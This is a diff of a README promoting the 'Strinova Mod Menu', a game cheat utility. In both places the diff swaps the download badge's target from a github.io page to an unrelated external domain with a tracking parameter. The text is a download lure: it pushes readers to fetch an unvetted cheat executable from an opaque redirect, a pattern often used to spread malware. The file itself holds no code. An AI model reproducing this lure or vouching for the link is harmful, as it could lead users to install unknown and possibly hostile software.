@@ -2,7 +2,7 @@
 
 The **Strinova Mod Menu** is a powerful and versatile cheat utility designed to work across a variety of supported games. Whether you're looking to dominate PvE, explore hidden mechanics, or customize your gameplay with ease, Strinova brings you advanced control with an intuitive, in-game interface.
 
-[![Download Strinova ModMenu](https://img.shields.io/badge/Download-Strinova%20ModMenu-blueviolet)](https://strinova-mod-menu.github.io/.github/)
+[![Download Strinova ModMenu](https://img.shields.io/badge/Download-Strinova%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 From visual enhancements and player buffs to item spawning and teleportation, Strinova gives you the power to tailor your experience like never before.
 
@@ -62,4 +62,4 @@ From visual enhancements and player buffs to item spawning and teleportation, St
 
 Strinova Mod Menu provides the ultimate toolkit for creative, custom, and stress-free gameplay. Whether you're experimenting, exploring, or just having fun—**Strinova puts the power in your hands.** 💻🌟
 
-[![Download Strinova ModMenu](https://img.shields.io/badge/Download-Strinova%20ModMenu-blueviolet)](https://strinova-mod-menu.github.io/.github/)
+[![Download Strinova ModMenu](https://img.shields.io/badge/Download-Strinova%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
